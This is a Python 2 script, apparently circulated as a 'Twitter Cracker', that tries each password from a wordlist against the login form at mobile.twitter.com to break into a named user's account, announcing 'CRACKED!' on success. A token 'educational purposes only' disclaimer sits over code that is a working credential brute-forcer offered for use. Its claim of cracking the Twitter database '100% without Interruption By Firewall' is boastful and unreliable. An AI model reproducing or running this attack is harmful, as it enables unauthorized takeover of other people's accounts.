#!usr/bin/python
#Twitter Cracker Version 1 can crack into Twitter Database 100% without Interruption By Firewall !
#This program is for educational purposes only.
#Don't attack people Twitter accounts it's illegal ! 
#If you want to crack into someone's account, you must have the permission of the user. 
#Mauritania Attacker is not responsible.


import sys
import random
import mechanize
import cookielib


GHT = '''
        
'''
print
print
print



username = str(raw_input("User => : "))
passwordlist = str(raw_input("List => : "))

useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]



login = 'https://mobile.twitter.com/session'
def attack(password):

  try:
     sys.stdout.write("\r[*] trying %s.. " % password)
     sys.stdout.flush()
     br.addheaders = [('User-agent', random.choice(useragents))]
     site = br.open(login)
     br.select_form(nr=0)

      
     
	 
	 ##Twitter
     br.form['username'] = username
     br.form['password'] = password
     br.submit()
     log = br.geturl()
     if log != login:
        print "\n\n\n CRACKED!"
        print "\n [#] Login => : %s\n" % (password)
        sys.exit(1)
  except KeyboardInterrupt:
        print "\nExiting program .. "
        sys.exit(1)

def search():
    global password
    for password in passwords:
        attack(password.replace("\n",""))



def check():

    global br
    global passwords
    try:
       br = mechanize.Browser()
       cj = cookielib.LWPCookieJar()
       br.set_handle_robots(False)
       br.set_handle_equiv(True)
       br.set_handle_referer(True)
       br.set_handle_redirect(True)
       br.set_cookiejar(cj)
       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    except KeyboardInterrupt:
       print "\nExiting program ..\n"
       sys.exit(1)
    try:
       list = open(passwordlist, "r")
       passwords = list.readlines()
       k = 0
       while k < len(passwords):
          passwords[k] = passwords[k].strip()
          k += 1
    except IOError:
        print "\n [!] Error: cek wordlist lu jing \n"
        sys.exit(1)
    except KeyboardInterrupt:
        print "\n Exiting program ..\n"
        sys.exit(1)
    try:
        print GHT
        print "[#]Testing => : %s" % (username)
        print "[$] Loaded :" , len(passwords), "passwords"
        print " Starting...."
    except KeyboardInterrupt:
        print "\n Exiting program ..\n"
        sys.exit(1)
    try:
        search()
        attack(password)
    except KeyboardInterrupt:
        print "\n Exiting program ..\n"
        sys.exit(1)

if __name__ == '__main__':
    check()
